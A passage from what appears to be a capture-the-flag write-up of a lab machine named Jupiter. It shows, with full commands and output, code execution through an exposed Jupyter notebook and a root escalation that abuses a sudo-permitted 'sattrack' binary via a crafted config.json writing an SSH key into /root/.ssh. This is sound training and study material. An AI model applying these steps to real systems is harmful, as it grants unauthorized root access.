[I 07:38:18.720 NotebookApp] Malformed HTTP message from 127.0.0.1: Malformed HTTP request line
[I 07:43:51.035 NotebookApp] 302 GET / (127.0.0.1) 1.460000ms
```

I created an SSH tunnel, reloaded the UI, and used the found token to connect.

```bash
$ ssh -L 8888:localhost:8888 juno@target
```

![Jupyter Connected](/assets/images/2023/08/Jupiter/JupyterConnected.png "Jupyter Connected")

I opened the Flare notebook.

![Running Notebook](/assets/images/2023/08/Jupiter/RunningNotebook.png "Running Notebook")

I could modify the code it ran from the UI. I searched how to run commands and saw that if I use [%%bash](https://stackoverflow.com/questions/38694081/executing-terminal-commands-in-jupyter-notebook/58047187#58047187), I could use bash commands.

![Jupyter RCE](/assets/images/2023/08/Jupiter/JupyterRCE.png "Jupiter RCE")

I used this to copy my SSH public key in jovian's home folder.

![Copy SSH Key](/assets/images/2023/08/Jupiter/JupyterCopySSHKey.png "Copy SSH Key")

I reconnected as jovian using my key.

```bash
$ ssh jovian@target
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 23 12:06:49 PM UTC 2023

  System load:           0.0
  Usage of /:            81.5% of 12.33GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             243
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.216
  IPv6 address for eth0: dead:beef::250:56ff:feb9:78c4


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


jovian@jupiter:~$
```


## Getting Root

Once connected I checked if I could run anything with sudo.

```bash
jovian@jupiter:~$ sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack

jovian@jupiter:~$ file /usr/local/bin/sattrack
/usr/local/bin/sattrack: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c68bedeeb5dd99903454a774db56a7a533ce7ff4, for GNU/Linux 3.2.0, not stripped

jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
```

I was allowed to run the `sattrack` executable but it was missing a configuration file. I ran `strings` on it. It appears to read a JSON configuration from `/tmp`.

```bash
jovian@jupiter:~$ strings /usr/local/bin/sattrack
...
[json.exception.
 at line 
, column 
/tmp/config.json
Configuration file has not been found. Please try again!
tleroot
...
```

I created the file and tried again.

```bash
jovian@jupiter:/tmp$ cat /tmp/config.json
{
}
jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack
Satellite Tracking System
tleroot not defined in config
```

It used the file, but I did not know what the expected configurations were. I checked the server for example configurations.

```bash
jovian@jupiter:/tmp$ find / -name config.json 2>/dev/null
/usr/local/share/sattrack/config.json
/usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
/tmp/config.json

jovian@jupiter:/tmp$ cp /usr/local/share/sattrack/config.json /tmp/config.json

jovian@jupiter:~$ sudo /usr/local/bin/sattrack
Satellite Tracking System
tleroot does not exist, creating it: /tmp/tle/
Get:0 http://celestrak.org/NORAD/elements/weather.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/noaa.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle
Could not resolve host: celestrak.org
Satellites loaded
No sats

jovian@jupiter:~$ ls -la /tmp/tle/
total 8
drwxr-xr-x  2 root root 4096 Aug 27 12:55  .
drwxrwxrwt 15 root root 4096 Aug 27 12:56  ..
-rw-r--r--  1 root root    0 Aug 27 12:55 'gp.php?GROUP=starlink&FORMAT=tle'
-rw-r--r--  1 root root    0 Aug 27 12:54  noaa.txt
-rw-r--r--  1 root root    0 Aug 27 12:54  weather.txt
```

The application was trying to read files from the internet. I looked at what the configuration contained.

```bash
jovian@jupiter:~$ cat /tmp/config.json
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://celestrak.org/NORAD/elements/weather.txt",
                "http://celestrak.org/NORAD/elements/noaa.txt",
                "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

I modified it to try to read root's SSH key. That failed, root did not have a key.

The application was writing files in the `tleroot` folder. I tried using that to write my public key in root's home folder.

```bash
jovian@jupiter:~$ cat /tmp/config.json 
{
        "tleroot": "/root/.ssh/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "file:///tmp/authorized_keys"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

I ran the application.

```bash
jovian@jupiter:~$ sudo /usr/local/bin/sattrack
Satellite Tracking System
Get:0 file:///tmp/authorized_keys
tlefile is not a valid file
```

It gave me an error, but when I tried connecting as root it worked.

```bash
$ ssh root@target
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 23 01:52:13 PM UTC 2023

  System load:           0.0
  Usage of /:            81.5% of 12.33GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             238
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.216
  IPv6 address for eth0: dead:beef::250:56ff:feb9:78c4


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jul 23 13:52:14 2023 from 10.10.14.8
root@jupiter:~# cat root.txt
REDACTED
```